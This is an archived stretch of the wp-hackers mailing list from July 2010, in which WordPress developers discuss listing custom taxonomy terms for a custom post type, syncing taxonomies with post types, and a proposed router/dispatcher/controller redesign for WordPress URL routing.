References: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>
Message-ID: <7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>

Hi Jimmy,

I'm assuming that you know how to create a sidebar widget so I'll skip that step.  Here's the basic code you need:

	// $post is assumed to be a post for a Movie	
	$actors = wp_get_object_terms($post->ID,'actor');
	echo '<ul>';
	foreach($actors as $actor) {
		echo '<li>';
		echo $actor->name;
		echo '</li>';
	}
	echo '</ul>';

Hope it helps.

-Mike

On Jul 2, 2010, at 12:32 PM, Jimmy Roy wrote:

> sorry for double post, I forgot to change the message object.
> 
> hi all,
> I just start to play with custom post type and custom taxonomies.
> I follow the excellent tutorial by Justin Tadlock everything works fine, now
> I want to display the list of taxonomies associate to my new custom post
> type (something like wp_list_categories()).
> 
> for example I create a new custom post type called Movie and a taxonomy
> called Actor.
> 
> I want to display in the sidebar :
> *Actors*
> 
>   - Brad Pitt
>   - Georges Clooney
>   - ...
> 
> any idea to do that?
> 
> thank u for your help.
> 
> Jimmy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Fri Jul  2 18:38:51 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 14:38:51 -0400
Subject: [wp-hackers] Synchronizing Custom Taxonomies with Custom Post Types?
Message-ID: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>

Has anyone worked with synchronizing custom taxonomies with custom post types?

I need to use a custom taxonomy to associate with a custom post type so that I can relate instances of the two custom post types in a many-to-many relationship and so I can use the taxonomy selector widget in the admin for existing UI.  Basically I want to hide the taxonomy management functionality in the admin (I've already written the code to do this) and then create and maintain the term each time I insert or update it's associated post.  Also, I'm sure I'll need some "helper" functions and/or hooks written to support external use of this integration.

With custom post types I'll bet this will emerge to be a common use-case so I was wondering if anyone has already done this? If so would you be willing to share the code so I and others don't have to write it from scratch?  

Thanks in advance.

-Mike

From scribu at gmail.com  Fri Jul  2 18:40:52 2010
From: scribu at gmail.com (scribu)
Date: Fri, 2 Jul 2010 21:40:52 +0300
Subject: [wp-hackers] display the list of new taxonomy
In-Reply-To: <7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>
References: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>
	<7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>
Message-ID: <AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>

Actually, there's a template tag for that:

the_taxonomies()<http://xref.yoast.com/trunk/nav.html?_functions/the_taxonomies.html>


On Fri, Jul 2, 2010 at 9:13 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> Hi Jimmy,
>
> I'm assuming that you know how to create a sidebar widget so I'll skip that
> step.  Here's the basic code you need:
>
>        // $post is assumed to be a post for a Movie
>        $actors = wp_get_object_terms($post->ID,'actor');
>        echo '<ul>';
>        foreach($actors as $actor) {
>                echo '<li>';
>                echo $actor->name;
>                echo '</li>';
>        }
>        echo '</ul>';
>
> Hope it helps.
>
> -Mike
>
> On Jul 2, 2010, at 12:32 PM, Jimmy Roy wrote:
>
> > sorry for double post, I forgot to change the message object.
> >
> > hi all,
> > I just start to play with custom post type and custom taxonomies.
> > I follow the excellent tutorial by Justin Tadlock everything works fine,
> now
> > I want to display the list of taxonomies associate to my new custom post
> > type (something like wp_list_categories()).
> >
> > for example I create a new custom post type called Movie and a taxonomy
> > called Actor.
> >
> > I want to display in the sidebar :
> > *Actors*
> >
> >   - Brad Pitt
> >   - Georges Clooney
> >   - ...
> >
> > any idea to do that?
> >
> > thank u for your help.
> >
> > Jimmy
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From wp at andrewnacin.com  Fri Jul  2 18:44:08 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Fri, 2 Jul 2010 14:44:08 -0400
Subject: [wp-hackers] display the list of new taxonomy
In-Reply-To: <AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>
References: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com> 
	<7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>
	<AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>
Message-ID: <AANLkTikJn-03NZnhIRW1s_4k1daa-Ci5zGsmjnWjEAfc@mail.gmail.com>

And, wp_list_categories() takes a taxonomy arg as well.

On Fri, Jul 2, 2010 at 2:40 PM, scribu <scribu at gmail.com> wrote:

> Actually, there's a template tag for that:
>
> the_taxonomies()<
> http://xref.yoast.com/trunk/nav.html?_functions/the_taxonomies.html>
>
>
> On Fri, Jul 2, 2010 at 9:13 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
>
> > Hi Jimmy,
> >
> > I'm assuming that you know how to create a sidebar widget so I'll skip
> that
> > step.  Here's the basic code you need:
> >
> >        // $post is assumed to be a post for a Movie
> >        $actors = wp_get_object_terms($post->ID,'actor');
> >        echo '<ul>';
> >        foreach($actors as $actor) {
> >                echo '<li>';
> >                echo $actor->name;
> >                echo '</li>';
> >        }
> >        echo '</ul>';
> >
> > Hope it helps.
> >
> > -Mike
> >
> > On Jul 2, 2010, at 12:32 PM, Jimmy Roy wrote:
> >
> > > sorry for double post, I forgot to change the message object.
> > >
> > > hi all,
> > > I just start to play with custom post type and custom taxonomies.
> > > I follow the excellent tutorial by Justin Tadlock everything works
> fine,
> > now
> > > I want to display the list of taxonomies associate to my new custom
> post
> > > type (something like wp_list_categories()).
> > >
> > > for example I create a new custom post type called Movie and a taxonomy
> > > called Actor.
> > >
> > > I want to display in the sidebar :
> > > *Actors*
> > >
> > >   - Brad Pitt
> > >   - Georges Clooney
> > >   - ...
> > >
> > > any idea to do that?
> > >
> > > thank u for your help.
> > >
> > > Jimmy
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Jul  2 19:15:02 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 15:15:02 -0400
Subject: [wp-hackers] display the list of new taxonomy
In-Reply-To: <AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>
References: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>
	<7D478DE4-0EAF-4F71-A1B1-CAB19764BAE7@newclarity.net>
	<AANLkTikMkxSpTD7FjC0duZZo6ezMFqq5ckQ7jWIEJT4w@mail.gmail.com>
Message-ID: <BD6595C3-D0C7-48D6-9597-9CA3BF5DCE70@newclarity.net>

On Jul 2, 2010, at 2:40 PM, scribu wrote:
> Actually, there's a template tag for that:
> 
> the_taxonomies()<http://xref.yoast.com/trunk/nav.html?_functions/the_taxonomies.html>

That's similar, but not identical. For example, if he had 2 taxonomies (i.e. Actor, Genre) the following:

	the_taxonomies(array('post'=>$post->ID,'before'=>'<ul><li>','sep'=>'</li><li>','after'=>'</li></ul>'));

Could generate this HTML where the taxonomies are bulleted, not the terms:

	- Actor: Brad Pitt, Georges Clooney,  ...
	- Genre: Comedy, Drama, ...

On Jul 2, 2010, at 2:44 PM, Andrew Nacin wrote:
> And, wp_list_categories() takes a taxonomy arg as well.


Yes, the following will create an equivalent list of all Actors:

	wp_list_categories(array('taxonomy'=>'practice-area','title_li'=>''));

But as far as I can tell there's no easy way to get it to limit to Actors that are associated with a specific Movie.  Am I missing something?

-Mike

> 
> 
> On Fri, Jul 2, 2010 at 9:13 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>> Hi Jimmy,
>> 
>> I'm assuming that you know how to create a sidebar widget so I'll skip that
>> step.  Here's the basic code you need:
>> 
>>       // $post is assumed to be a post for a Movie
>>       $actors = wp_get_object_terms($post->ID,'actor');
>>       echo '<ul>';
>>       foreach($actors as $actor) {
>>               echo '<li>';
>>               echo $actor->name;
>>               echo '</li>';
>>       }
>>       echo '</ul>';
>> 
>> Hope it helps.
>> 
>> -Mike
>> 
>> On Jul 2, 2010, at 12:32 PM, Jimmy Roy wrote:
>> 
>>> sorry for double post, I forgot to change the message object.
>>> 
>>> hi all,
>>> I just start to play with custom post type and custom taxonomies.
>>> I follow the excellent tutorial by Justin Tadlock everything works fine,
>> now
>>> I want to display the list of taxonomies associate to my new custom post
>>> type (something like wp_list_categories()).
>>> 
>>> for example I create a new custom post type called Movie and a taxonomy
>>> called Actor.
>>> 
>>> I want to display in the sidebar :
>>> *Actors*
>>> 
>>>  - Brad Pitt
>>>  - Georges Clooney
>>>  - ...
>>> 
>>> any idea to do that?
>>> 
>>> thank u for your help.
>>> 
>>> Jimmy
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> 
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at santosj.name  Fri Jul  2 21:37:38 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 2 Jul 2010 16:37:38 -0500
Subject: [wp-hackers] Controller Implementation
Message-ID: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>

I think the problems can be listed as the following:

1. Too difficult without a lot of documentation.
2. Isn't extensible enough to automate some queries for posts.
3. Not a true controller implementation.

I think Mike's ticket (#12935), deals with the second. Mine deals with the
third and neither really deal with the first at this time.

I think the biggest problem with the routing is that it isn't dispatching to
any controller. Therefore, you can set the routing to get past the initial
404 settings in WordPress, but you'd need to handle the dispatching
yourself. It is easier, to just do the dispatching yourself and then
"correct" the 404 status and the title or hook an action that starts before
wp() function executes.

The goal of the router should be to only find the controller for dispatching
to. The querying that is part of the WP_Rewrite and WP_Query now complicates
and confuses the role of the router and doesn't satisfy the separation of
roles. Which is why rewriting the entire process would be better, but
generally off the table as backwards compatibility is required. It is also
isn't necessary to rewrite everything to implement the new controller
implementation.

I propose the following:

For WordPress 3.1, include the completed controller router and dispatcher,
separate from the current WordPress front controller. Including a new action
that takes place before wp() function executes.

Some time after that, move some of the rewrites option to the new controller
and start dispatching to functions and classes for feeds and other
non-essential actions that can be tested and if there is any problem can
wait for a minor release or next release. Meaning less people will notice
after they upgrade and some edge cases weren't completely tested. During the
period between 3.1 and say for example 3.2 or 3.3, enough plugin developers
should be using the new controller as to allow for enough testing to certify
that it is stable enough to use in core.

After that, address the second in the above list while moving the rest of
the post, pages, etc to the controller. Deprecate the old way and move the
WP_Rewrite to the new system where logical.

Any suggestions on the implementation, current (in patch) or future, and
ideas?

Jacob Santos

#12935 - http://core.trac.wordpress.org/ticket/12935

From jeremy at visser.name  Fri Jul  2 22:39:41 2010
From: jeremy at visser.name (Jeremy Visser)
Date: Sat, 03 Jul 2010 08:39:41 +1000
Subject: [wp-hackers] Tracking changes for posts
In-Reply-To: <AANLkTil8doSIxvav1zALYaWD7NjKhdNGEGs6Saxi1a0x@mail.gmail.com>
References: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>	<4C2E0614.3060905@mullenweg.com>
	<AANLkTil8doSIxvav1zALYaWD7NjKhdNGEGs6Saxi1a0x@mail.gmail.com>
Message-ID: <4C2E6AAD.6060104@visser.name>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Wordpress Developer said:
> On Fri, Jul 2, 2010 at 8:30 AM, Matt Mullenweg <m at mullenweg.com> wrote:
>> Could you please change your name and email, and if you're going to use
>> something so confusing at least capitalize the P correctly.
>
> I'll remove myself from the list. Thanks for the kind welcome, Matt.

Uncalled for. Matt's request is entirely reasonable. Had he not said
that first (timezones ftl), I probably would have too.

A long time ago, we had a prominent participant in the list called
'Computer Guru' which would have been just as generic in another
situation, but thankfully he remained unique here. (About the time he
disappeared from this list, he changed aliases to Mahmoud Al-Qudsi.)

Jeremy.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAkwuaqsACgkQvs6Qqs8TxBrhRgCfejubJUKRAT6h2RnFVQx0rXeF
aBcAnA2r5ftQMtMtZ78aXCS1Zz+UATUS
=/24d
-----END PGP SIGNATURE-----

From mikeschinkel at newclarity.net  Fri Jul  2 23:43:35 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 19:43:35 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
Message-ID: <AE3A6EC8-121C-483F-A995-76E420A1C83F@newclarity.net>

Hi Jacob,

I definitely agree that routing in WordPress is complicated unless are really familiar with how it works.  And I agree that WordPress does not use a "true" controller and that controllers provide a nice architecture.  OTOH, after getting to intimately know how WordPress routes URLs (although at times I still struggle with putting that knowledge to use given its complexities) I wonder if swapping out the existing routing and replacing it with a "true" controller wouldn't change WordPress so fundamentally that is would in effect no longer be WordPress?  

What I mean by that is WordPress is designed around the query where a URL(-like) query maps to a SQL query and WordPress sets lots of context flags based on the query.  If we had a controller that bypassed the query then much of the core code and many of the plugins written for WordPress would be written on obsolete concepts and without a solid replacement for inspecting context.  IOW, using a controller would require us to add a new "context" system (and/or use the old one by complex mapping, but then what have you gained?)

I'm not disagreeing with you (yet?) but I am unsure how a URL controller could ever work within WordPress given all the existing plugins and the existing pool of knowledge and experience that people have regarding the way WordPress work today?  I guess I bring this up to further spark discussion/debate on the topic.

-Mike
P.S. For background for those who've not been paying attention to ticket #12935 I basically proposed a replacement for the WP_Rewrite system I called WP_Routes that would replace as little as possible in core WordPress. WP_Routes would inspect URL paths segments by various matching methods rather than by regex match of the full URL currently used by WP_Rewrite.



On Jul 2, 2010, at 5:37 PM, Jacob Santos wrote:

> I think the problems can be listed as the following:
> 
> 1. Too difficult without a lot of documentation.
> 2. Isn't extensible enough to automate some queries for posts.
> 3. Not a true controller implementation.
> 
> I think Mike's ticket (#12935), deals with the second. Mine deals with the
> third and neither really deal with the first at this time.
> 
> I think the biggest problem with the routing is that it isn't dispatching to
> any controller. Therefore, you can set the routing to get past the initial
> 404 settings in WordPress, but you'd need to handle the dispatching
> yourself. It is easier, to just do the dispatching yourself and then
> "correct" the 404 status and the title or hook an action that starts before
> wp() function executes.
> 
> The goal of the router should be to only find the controller for dispatching
> to. The querying that is part of the WP_Rewrite and WP_Query now complicates
> and confuses the role of the router and doesn't satisfy the separation of
> roles. Which is why rewriting the entire process would be better, but
> generally off the table as backwards compatibility is required. It is also
> isn't necessary to rewrite everything to implement the new controller
> implementation.
> 
> I propose the following:
> 
> For WordPress 3.1, include the completed controller router and dispatcher,
> separate from the current WordPress front controller. Including a new action
> that takes place before wp() function executes.
> 
> Some time after that, move some of the rewrites option to the new controller
> and start dispatching to functions and classes for feeds and other
> non-essential actions that can be tested and if there is any problem can
> wait for a minor release or next release. Meaning less people will notice
> after they upgrade and some edge cases weren't completely tested. During the
> period between 3.1 and say for example 3.2 or 3.3, enough plugin developers
> should be using the new controller as to allow for enough testing to certify
> that it is stable enough to use in core.
> 
> After that, address the second in the above list while moving the rest of
> the post, pages, etc to the controller. Deprecate the old way and move the
> WP_Rewrite to the new system where logical.
> 
> Any suggestions on the implementation, current (in patch) or future, and
> ideas?
> 
> Jacob Santos
> 
> #12935 - http://core.trac.wordpress.org/ticket/12935
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From bulk at thecodecave.com  Fri Jul  2 23:43:51 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Fri, 2 Jul 2010 19:43:51 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
Message-ID: <001501cb1a40$6e402dc0$4ac08940$@com>

Wow, I'd not read this ticket yet. You and Mike have put a lot of work into
the design.  I've made it about halfway through the ticket, but have to get
back on task.  I just want to say thank you for your effort so far. I will
keep reading.

The only thing that I'd like to observe right now is that we need to
remember that point #2, covered by Mike's ticket, has two implications 1.
that when a request arrives at the site, isolating a single post may not be
possible and 2. when permalinks are determined as a "post" is created, a
unique permalink can no-longer be guaranteed.  Your proposal covers both
situations, if the editor first queries the router and then queries the
returned controller.  Changing permalink structures should cause a
reverification of posts before it is accepted, but thinking of the workload
caused by that on large sites makes me cringe.

BTW what is the number for your ticket?

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?RhettandLink.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From mikeschinkel at newclarity.net  Fri Jul  2 23:52:35 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 19:52:35 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <001501cb1a40$6e402dc0$4ac08940$@com>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
	<001501cb1a40$6e402dc0$4ac08940$@com>
Message-ID: <C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>

On Jul 2, 2010, at 7:43 PM, Brian Layman wrote:
> Wow, I'd not read this ticket yet. You and Mike have put a lot of work into
> the design.  I've made it about halfway through the ticket, but have to get
> back on task.  I just want to say thank you for your effort so far. I will
> keep reading.

Yes, a bit of work.  Thanks for noticing. :)

> The only thing that I'd like to observe right now is that we need to
> remember that point #2, covered by Mike's ticket, has two implications 1.
> that when a request arrives at the site, isolating a single post may not be
> possible and

Note sure I follow.  Can you clarify with an example or two?

> 2. when permalinks are determined as a "post" is created, a
> unique permalink can no-longer be guaranteed.  

Again, not sure I follow.  And again, can you clarify with an example or two?

> Your proposal covers both situations, if the editor first queries the router
> and then queries the returned controller.

By "your proposal" do you mean Jacob's or mine?  Who/want is "the editor?"  When you say "router", do you mean the existing WP_Rewrite or the WP_Routes I was proposing?

> Changing permalink structures should cause a reverification of posts
> before it is accepted, but thinking of the workload caused by that on
> large sites makes me cringe.

I also don't follow that. What do you mean by "re-verification" and who/what is doing the "accepting?" Is the workload human or computer?

Thanks in advance for clarifying.

-Mike

From Brian at TheCodeCave.com  Sat Jul  3 00:55:07 2010
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri, 2 Jul 2010 20:55:07 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>	<001501cb1a40$6e402dc0$4ac08940$@com>
	<C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
Message-ID: <001901cb1a4a$62d09510$2871bf30$@com>

Sure.. Maybe this will help..  If I am still not making sense, just nm it's
been a long day. It makes sense to me at least :D

>> when a request arrives at the site, isolating a single post may not be
>> possible
> Note sure I follow.  Can you clarify with an example or two?
This was a basically a reiteration of your initial statement in #12935:
<blockquote>
  As WordPress grows into a proper CMS with MultiSite and Custom Post Types
and Custom Taxonomies there are frequent opportunities for URL conflict that
didn't occur as often with just Posts and Pages. 
Here's a simple example, let's say a company uses WordPress for their
website and they offer development services as well as training on their
website: 
http://example.com/services/vmware/
http://example.com/training/vmware/
</blockquote>



>> 2. when permalinks are determined as a "post" is created, a
>> unique permalink can no-longer be guaranteed.  
> Again, not sure I follow.  And again, can you clarify with an example or
two?
When you are creating a new post, if there is a conflict, the permalink/slug
is modified to prevent the conflict in the first place (by adding a -2 or
whatever). If the goal is to create a system that can quickly identify the
globally unique target for an URL, I would seem that there is a tie in to
this functionality. It should be able to tell you if the proposed permalink
would an existing target.




>> Your proposal covers both situations, if the editor first queries the
router
>> and then queries the returned controller.
>By "your proposal" do you mean Jacob's or mine?  Who/want is "the editor?"
When you say "router", do you mean the existing WP_Rewrite >or the WP_Routes
I was proposing?
You=Jacob, as I was replying to his post to the list and the Router &
controller concepts as discussed there-in. You'd not replied yet when I hit
send.




>> Changing permalink structures should cause a reverification of posts
>> before it is accepted, but thinking of the workload caused by that on
>> large sites makes me cringe.
> I also don't follow that. What do you mean by "re-verification" and
who/what is doing the "accepting?" 
> Is the workload human or computer?
I added this as I was thinking about how a blog admin could choose a new
permalink structure and inadvertanly cause many urls to no longer be
globally unique.

Hope that helps...

-b


From wordpress at santosj.name  Sat Jul  3 01:03:06 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 02 Jul 2010 20:03:06 -0500
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>	<001501cb1a40$6e402dc0$4ac08940$@com>
	<C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
Message-ID: <4C2E8C4A.9030504@santosj.name>

Mike's ticket deals with extending the routing system in mapping 
WP_Query to URLs, whereas I'm dealing more with the whole of a 
controller implementation. So from what I can gather, and correct me if 
I'm wrong, it would be rewriting or extending what WP_Rewrite handles 
and extending what WP_Query does. The segment idea, and you'll have to 
read the ticket for more, is a great one. I haven't yet seen Mike's 
solution and I would like to, but I don't want to wait that long for a 
solution.

Definition of some terms:

Router / Routing : Much like a network router, you are mapping a URL 
path to a controller (in my case) or in Mike's case, it would work much 
like what it does now, just have more options. If you understand the 
WP_Rewrite system now, then Mike's proposal is just taking that and 
adding more features to it.

Dispatcher: This is really what is missing in WordPress. You can setup 
the routes in WordPress, but once the route has been matched, then it 
just writes to a variable and requires that you check it in an action, 
either template_redirect or sooner (better if it is done sooner to 
prevent wp() from running and setting 404 calls, if you didn't use 
WP_Rewrite to set it up). It won't automatically call your function or 
class. This is part of my proposal to the rewrite. All MVC frameworks 
and libraries will dispatch to the controller once the route has been 
matched.

Controller: Really, the controller handles setting up the view, using 
models to connect the data to the view. Whereas, in most controllers you 
would only set up the data that you need, WordPress tends to setup 
everything needed for the loop, whether it is needed or not.

There are more "features" and implementations may get into actions, 
modules, and other concepts to ease the pain of setting up the 
controller, but for WordPress it isn't important because I believe the 
Plugin API handles much of what the others implement as part of the 
controller.

My focus is getting away from the database option where reasonable. Some 
routes are static and therefore do not need to be placed in the 
rewrite_rules option. Some routes do not require everything that the 
Loop requires and the permalink will not change. The difficulty and I 
understand truly, is that posts, pages, archives, categories, and tags 
can be customized and this behavior does not have to change. Neither 
proposal is suggesting making the permalink hard coded. Some routes are 
hard coded regardless and therefore do not need to be in the database.

The reason it is useful for the dispatching is that you don't require 
many functions to hook into an action to test whether they need to run. 
Any function or class that is called knows full well that it is meant to 
run and only needs to focus on setting up the data for the view. Really, 
as I was thinking about it, it might be better to require all 
controllers be classes, since the init process can setup data for the 
class. I just like the idea that WordPress allows for functions and 
classes for majority of features, so there is hardly any reason to block 
that for this one.

On 7/2/2010 6:43 PM, Brian Layman wrote:
> that when a request arrives at the site, isolating a single post may not be
> possible

I don't see how, part of the router implementation is to allow for this. 
However, honestly, the posts and other dynamic permalink structures are 
not meant for the router anyway. I implemented what it might look like 
based on existing WordPress code, but I've since decided to leave 
WordPress as it is and simply implement a separate system that functions 
separate and before the WordPress front controller. Most plugins know 
what their permalink is going to be and therefore do not require such 
dynamic tests and generations.

It has given me an idea, in that difficult plugins might wish to set a 
base for their permalink. So say, if you had two gallery plugins using 
the system, the plugin would allow you to set the base. For example, 
gallery plugin 1 would be '/gallery/' and gallery 2 plugin would be 
'/friends/'. So instead of conflicting plugins causing issues with one 
or the other able to be activated at a time, both could be.

> and 2. when permalinks are determined as a "post" is created, a
> unique permalink can no-longer be guaranteed.

Well, normally when working with a MVC system, when you change 
"permalinks" as it is, it is manual process, so you would simply keep 
the old controller and then redirect to the new. Kind of like the 
canonical URLs, but manual.

The Dispatching process does not work that way. The router simply checks 
the URL and once it matches one, it stops and then dispatches to the 
Controller. Router -> Dispatcher -> Controller. There is no 
reverification process. The controller would simply go through the URI 
segments and find the post and then load the view. I think I will also 
create a route that works with the permalinks in order to have a better 
example of how this will work.

Alas, that is also why I think this is good. WordPress doesn't actually 
use its own system to create the routes, in so much as to give an 
example to plugin and theme developers as to how to use the system. The 
new controller implementation will have many examples of how it is used 
and setup.

From mikeschinkel at newclarity.net  Sat Jul  3 01:13:00 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 21:13:00 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <001901cb1a4a$62d09510$2871bf30$@com>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>	<001501cb1a40$6e402dc0$4ac08940$@com>
	<C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
	<001901cb1a4a$62d09510$2871bf30$@com>
Message-ID: <2FCF2B03-7900-464D-8C9A-98D1851CAFDB@newclarity.net>

On Jul 2, 2010, at 8:55 PM, Brian Layman wrote:
> Sure.. Maybe this will help..  If I am still not making sense, just nm it's
> been a long day. It makes sense to me at least :D

Thanks for the efforts!

>>> when a request arrives at the site, isolating a single post may not be
>>> possible
>> Note sure I follow.  Can you clarify with an example or two?
> This was a basically a reiteration of your initial statement in #12935:
> <blockquote>
>  As WordPress grows into a proper CMS with MultiSite and Custom Post Types
> and Custom Taxonomies there are frequent opportunities for URL conflict that
> didn't occur as often with just Posts and Pages. 
> Here's a simple example, let's say a company uses WordPress for their
> website and they offer development services as well as training on their
> website: 
> http://example.com/services/vmware/
> http://example.com/training/vmware/
> </blockquote>

I wish I could rewrite that original opening.  I've since learned that I was wrong about that (if you set a post type to be hierarchical then only it's path segments need to be unique.)  I'm using that to great effect on a very complicated project I'm working on as we type...  Be sure to read the later comments.

>>> 2. when permalinks are determined as a "post" is created, a
>>> unique permalink can no-longer be guaranteed.  
>> Again, not sure I follow.  And again, can you clarify with an example or
> two?
> When you are creating a new post, if there is a conflict, the permalink/slug
> is modified to prevent the conflict in the first place (by adding a -2 or
> whatever).

Yes. And that behavior has caused me more trouble that you can possibly know.  There've been many contexts where I wish WordPress would block the user and force them to correct the duplicate URL slugs instead of WordPress quietly making an (incompatible for our needs) "slug-2."  This is especially true of the regrettable decision (IMO) to allow slugs in trashed posts to blog slugs for new posts.

> If the goal is to create a system that can quickly identify the
> globally unique target for an URL, I would seem that there is a tie in to
> this functionality.

Maybe, but only by orthogonally and by happenstance.

Ideally the system would enable the dev/themer to have more control over how path segments are generated.  That would be one of my many goals in this new approach.

> It should be able to tell you if the proposed permalink
> would an existing target.

Yes, that would be good.  

OTOH while I envision some routes being very much use involved (i.e. like the creation of a route for a new blog post) and others not being user involved at all (like date archives, lists of posts for a taxonomy term, etc.)

>>> Changing permalink structures should cause a reverification of posts
>>> before it is accepted, but thinking of the workload caused by that on
>>> large sites makes me cringe.
>> I also don't follow that. What do you mean by "re-verification" and
> who/what is doing the "accepting?" 
>> Is the workload human or computer?
> I added this as I was thinking about how a blog admin could choose a new
> permalink structure and inadvertanly cause many urls to no longer be
> globally unique.

Ah.  I'm not sure how it would work for Jacob's proposal but with my proposal I don't think that would exactly be possible (unless I am missing something.)   Besides, I'm envisioning URL routes to be done by theme/plugin coders, not admins. At least not initially.

> Hope that helps...

Yep, and ditto.
-Mike

From mikeschinkel at newclarity.net  Sat Jul  3 01:17:52 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 21:17:52 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <4C2E8C4A.9030504@santosj.name>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>	<001501cb1a40$6e402dc0$4ac08940$@com>
	<C0C63BB9-A886-44E7-9327-6D1E0E387FD4@newclarity.net>
	<4C2E8C4A.9030504@santosj.name>
Message-ID: <DB09EEFE-6E9F-4585-B83D-737298161FEB@newclarity.net>

> Mike's ticket deals with extending the routing system in mapping WP_Query to URLs, whereas I'm dealing more with the whole of a controller implementation. So from what I can gather, and correct me if I'm wrong, it would be rewriting or extending what WP_Rewrite handles and extending what WP_Query does. The segment idea, and you'll have to read the ticket for more, is a great one. I haven't yet seen Mike's solution and I would like to, but I don't want to wait that long for a solution.

